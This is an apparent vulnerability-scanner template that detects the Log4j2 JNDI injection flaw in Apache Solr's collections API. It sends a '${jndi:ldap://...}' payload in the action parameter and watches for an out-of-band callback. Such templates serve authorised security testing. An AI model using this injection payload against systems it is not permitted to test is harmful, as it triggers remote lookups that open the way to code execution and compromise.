name: Apache_Solr_collections_file_action_parameter_Log4j2_command_execution_vulnerability
transport: http
detail:
  dock: app="APACHE-Solr"
  product: Apache Solr
  homepage: https://solr.apache.org/index.html
  impact: <p>Apache Solr has Log4j2 jndi injection command execution vulnerability.
    Attackers can use this feature to construct special data request packets through
    this vulnerability, and ultimately trigger remote code execution.</p>
  description: <p>Apache Solr is an open source search service, developed using the
    Java language, mainly based on HTTP and Apache Lucene.</p><p>Apache Solr has Log4j2
    jndi injection command execution vulnerability. Attackers can use this feature
    to construct special data request packets through this vulnerability, and ultimately
    trigger remote code execution.</p>
set:
  reverse: newReverse()
  payload: '${jndi:ldap://' + reverse.domain + '}'
rules: 
  r1:
    method: "POST"
    url: "/solr/admin/collections?action={{payload}}"
    follow_redirects: false
    expression: reverse.wait(5)
expression: r1()
